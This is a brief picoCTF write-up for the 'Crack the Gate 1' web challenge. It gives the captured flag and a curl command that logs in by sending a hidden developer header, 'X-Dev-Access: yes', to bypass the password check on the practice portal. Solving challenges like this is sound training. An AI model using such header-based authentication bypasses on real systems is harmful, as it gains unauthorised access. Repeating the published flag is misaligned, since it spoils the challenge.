# Crack the Gate 1

# Descripción

Description
We’re in the middle of an investigation. One of our persons of interest, ctf player, is believed to be hiding sensitive data inside a restricted web portal. We’ve uncovered the email address he uses to log in: ctf-player@picoctf.org. Unfortunately, we don’t know the password, and the usual guessing techniques haven’t worked. But something feels off... it’s almost like the developer left a secret way in. Can you figure it out? The website is running here. Can you try to log in?
# Solución

picoCTF{brut4_f0rc4_125f752d}

```  
picoCTF{brut4_f0rc4_125f752d}
```

## Comandos usados:

```  
┌──(kali㉿kali)-[~/Downloads/Examen]
└─$ curl -s -X POST \
  -H "X-Dev-Access: yes" \
  -H "Content-Type: application/json" \
  -d '{"email":"ctf-player@picoctf.org","password":"whatever"}' \
  "http://amiable-citadel.picoctf.net:60318/login"
{"success":true,"email":"ctf-player@picoctf.org","firstName":"pico","lastName":"player","flag":"picoCTF{brut4_f0rc4_125f752d}"}    
```

# Notas adicionales

https://medium.com/@mugehajacky/crack-the-gate-1-picoctf-79d8a2983a23
# Referencias


